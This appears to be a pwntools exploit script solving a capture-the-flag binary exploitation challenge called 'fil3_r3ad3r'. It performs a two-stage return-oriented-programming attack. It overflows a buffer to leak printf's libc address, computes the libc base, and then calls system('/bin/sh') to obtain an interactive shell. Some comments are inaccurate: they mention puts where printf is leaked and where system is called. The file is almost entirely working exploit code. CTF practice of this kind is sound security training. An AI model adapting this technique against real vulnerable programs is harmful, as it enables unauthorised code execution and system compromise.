from pwn import *
import binascii

exe = './fil3_r3ad3r'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 

p = process(exe)

offset = 104
pop_rdi = 0x4014c3
ret = 0x40101a

payload = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        elf.got.printf,
        elf.plt.puts,  # Call puts() to leak the got.puts address
        elf.symbols.main  # Return to vuln (to overflow buffer with another payload)
    ]
})

p.sendlineafter(b'(Ex secret.txt): ', payload)
p.recvline()

addr = p.recvline()
print(addr)

leak_addr = '0x' + binascii.hexlify(addr[::-1].strip()).decode() # reverse the string and convert it to 0x form
print(leak_addr)

leak_puts = int(leak_addr, 16)
libc.address = leak_puts - libc.symbols.printf
binsh = next(libc.search(b'/bin/sh'))

print(f'/bin/sh : {binsh}')

payload2 = flat({
    offset: [
        pop_rdi,  # Pop got.puts into RDI
        binsh,
        ret,
        elf.plt.system,  # Call puts() to leak the got.puts address
          # Return to vuln (to overflow buffer with another payload)
    ]
})

p.sendlineafter(b'(Ex secret.txt): ', payload2)

p.interactive()

# 0x7f0175945000
# 0x7f903a0b8450